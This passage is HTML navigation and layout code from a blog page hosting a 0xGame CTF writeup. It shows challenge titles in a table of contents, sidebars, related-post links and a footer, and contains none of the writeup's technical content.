class="toc-item toc-level-3"><a class="toc-link" href="#fbi-open-the-door-5"><span class="toc-number">4.6.</span> <span class="toc-text">FBI Open The Door!! 5*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fbi-open-the-door-6"><span class="toc-number">4.7.</span> <span class="toc-text">FBI Open The Door!! 6*</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/56d4296b/" title="Parloo杯2025初赛 writeup+复现">Parloo杯2025初赛 writeup+复现</a><time datetime="2025-05-22T16:00:00.000Z" title="Created 2025-05-23 00:00:00">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/56d4296b/" title="盘古石杯2025初赛 Writeup+复现（断更中）">盘古石杯2025初赛 Writeup+复现（断更中）</a><time datetime="2025-05-19T16:00:00.000Z" title="Created 2025-05-20 00:00:00">2025-05-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/dde87c/" title="ISCC2025 Writeup">ISCC2025 Writeup</a><time datetime="2025-05-11T16:00:00.000Z" title="Created 2025-05-12 00:00:00">2025-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/24543801/" title="FIC2025初赛 writeup+复现">FIC2025初赛 writeup+复现</a><time datetime="2025-04-27T16:00:00.000Z" title="Created 2025-04-28 00:00:00">2025-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/29fccdc3/" title="ACTF2025 Writeup">ACTF2025 Writeup</a><time datetime="2025-04-26T16:00:00.000Z" title="Created 2025-04-27 00:00:00">2025-04-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/sea.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By St4rr</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="/js/tw_cn.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://www.blog.st4rr.top">St4rr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://www.blog.st4rr.top/posts/511d172f/">https://www.blog.st4rr.top/posts/511d172f/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/0xGame/">0xGame</a></div><div class="post_share"><div class="social-share" data-image="/img/grey_bwm.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/df428ec6/" title="极客大挑战2024 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">极客大挑战2024 Writeup</div></div></a></div><div class="next-post pull-right"><a href="/posts/829c310c/" title="强网杯2024 Misc 谍影重重5.0 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">强网杯2024 Misc 谍影重重5.0 Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/58e12fb0/" title="0xGame2023 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-24</div><div class="title">0xGame2023 Writeup</div></div></a></div><div><a href="/posts/29fccdc3/" title="ACTF2025 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-27</div><div class="title">ACTF2025 Writeup</div></div></a></div><div><a href="/posts/e41c2619/" title="2024暑假偷偷练习CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-28</div><div class="title">2024暑假偷偷练习CTF</div></div></a></div><div><a href="/posts/fabac5e4/" title="BeginCTF2024 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">BeginCTF2024 Writeup</div></div></a></div><div><a href="/posts/f0c8bac7/" title="BuildCTF2024 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-29</div><div class="title">BuildCTF2024 Writeup</div></div></a></div><div><a href="/posts/24543801/" title="FIC2025初赛 writeup+复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-28</div><div class="title">FIC2025初赛 writeup+复现</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/grey_bwm.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">St4rr</div><div class="author-info__description">想学一门技术(</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/123Starr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">由于博客内部路径更新，之前的一些评论及博客查看次数可能被吞:( 另外如果想联系作者，请移步至Comment板块留言:)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0xGame2048"><span class="toc-number">1.1.</span> <span class="toc-text">0xGame2048*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%98%8E%E4%B8%80%E6%9A%97"><span class="toc-number">1.2.</span> <span class="toc-text">一明一暗*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">加密的压缩包？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C%E5%9F%BA%E5%B2%A9%E7%89%88"><span class="toc-number">1.4.</span> <span class="toc-text">我的世界基岩版(?*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%9C%E5%91%9C%E5%91%9C-%E6%88%91%E5%86%8D%E4%B9%9F%E4%B8%8D%E6%95%A2%E4%B9%B1%E7%82%B9%E4%BA%86"><span class="toc-number">1.5.</span> <span class="toc-text">呜呜呜~我再也不敢乱点了*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%8F%AB%E6%9B%BC%E6%B3%A2"><span class="toc-number">1.6.</span> <span class="toc-text">我叫曼波</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E5%91%8A%E5%93%88%E5%9F%BA%E7%B1%B3"><span class="toc-number">1.7.</span> <span class="toc-text">报告哈基米</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E7%94%B5%E6%B3%A2"><span class="toc-number">1.8.</span> <span class="toc-text">神秘电波*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E5%8D%97%E9%82%AE%E5%BD%93CTF%E5%A4%A7%E7%8E%8B"><span class="toc-number">1.9.</span> <span class="toc-text">重生之我在南邮当CTF大王</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crazy-Thursday-v-me-50-btc"><span class="toc-number">1.10.</span> <span class="toc-text">Crazy Thursday v me 50 btc*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encrypted-file"><span class="toc-number">1.11.</span> <span class="toc-text">Encrypted file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Untouchable-flag"><span class="toc-number">1.12.</span> <span class="toc-text">Untouchable flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">2.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%92%E8%81%94%E7%BD%91%E7%9A%84%E4%B8%80%E8%A7%92"><span class="toc-number">2.1.</span> <span class="toc-text">互联网的一角*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E6%88%91%E5%B9%B2%E5%93%AA%E6%9D%A5%E4%BA%86%EF%BC%8C%E8%BF%99%E8%BF%98%E6%98%AF%E5%9B%BD%E5%86%85%E5%90%97%EF%BC%9F%EF%BC%9F"><span class="toc-number">2.2.</span> <span class="toc-text">给我干哪来了，这还是国内吗？？*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blockchain"><span class="toc-number">3.</span> <span class="toc-text">Blockchain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%82%98%EF%BC%8C%E4%B8%8A%E9%93%BE%EF%BC%81"><span class="toc-number">3.1.</span> <span class="toc-text">肘，上链！*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#theft"><span class="toc-number">3.2.</span> <span class="toc-text">theft</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%93%AA%E6%9D%A5%E9%82%A3%E4%B9%88%E5%A4%9A%E8%87%AD%E9%92%B1%EF%BC%9F%EF%BC%9F"><span class="toc-number">3.3.</span> <span class="toc-text">我哪来那么多臭钱？？*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">4.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%BB%E7%94%BB%E7%9A%84baby"><span class="toc-number">4.1.</span> <span class="toc-text">画画的baby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBI-Open-The-Door-1"><span class="toc-number">4.2.</span> <span class="toc-text">FBI Open The Door!! 1*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBI-Open-The-Door-2"><span class="toc-number">4.3.</span> <span class="toc-text">FBI Open The Door!! 2*</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">4.3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">4.3.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBI-Open-The-Door-3"><span class="toc-number">4.4.</span> <span class="toc-text">FBI Open The Door!! 3*</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-1"><span class="toc-number">4.4.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-1"><span class="toc-number">4.4.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBI-Open-The-Door-4"><span class="toc-number">4.5.</span> <span class="toc-text">FBI Open The Door!! 4*</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-2"><span class="toc-number">4.5.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-2"><span class="toc-number">4.5.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBI-Open-The-Door-5"><span class="toc-number">4.6.</span> <span class="toc-text">FBI Open The Door!! 5*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBI-Open-The-Door-6"><span class="toc-number">4.7.</span> <span class="toc-text">FBI Open The Door!! 6*</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f6af6eda/" title="Parloo杯2025初赛 writeup+复现">Parloo杯2025初赛 writeup+复现</a><time datetime="2025-05-22T16:00:00.000Z" title="Created 2025-05-23 00:00:00">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/56d4296b/" title="盘古石杯2025初赛 Writeup+复现（断更中）">盘古石杯2025初赛 Writeup+复现（断更中）</a><time datetime="2025-05-19T16:00:00.000Z" title="Created 2025-05-20 00:00:00">2025-05-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/dde87c/" title="ISCC2025 Writeup">ISCC2025 Writeup</a><time datetime="2025-05-11T16:00:00.000Z" title="Created 2025-05-12 00:00:00">2025-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/24543801/" title="FIC2025初赛 writeup+复现">FIC2025初赛 writeup+复现</a><time datetime="2025-04-27T16:00:00.000Z" title="Created 2025-04-28 00:00:00">2025-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/29fccdc3/" title="ACTF2025 Writeup">ACTF2025 Writeup</a><time datetime="2025-04-26T16:00:00.000Z" title="Created 2025-04-27 00:00:00">2025-04-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/sea.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By St4rr</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="/js/tw_cn.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
   window.MathJax = {
     tex: {
       inlineMath: [['$', '$'], ['\\(', '\\)']],
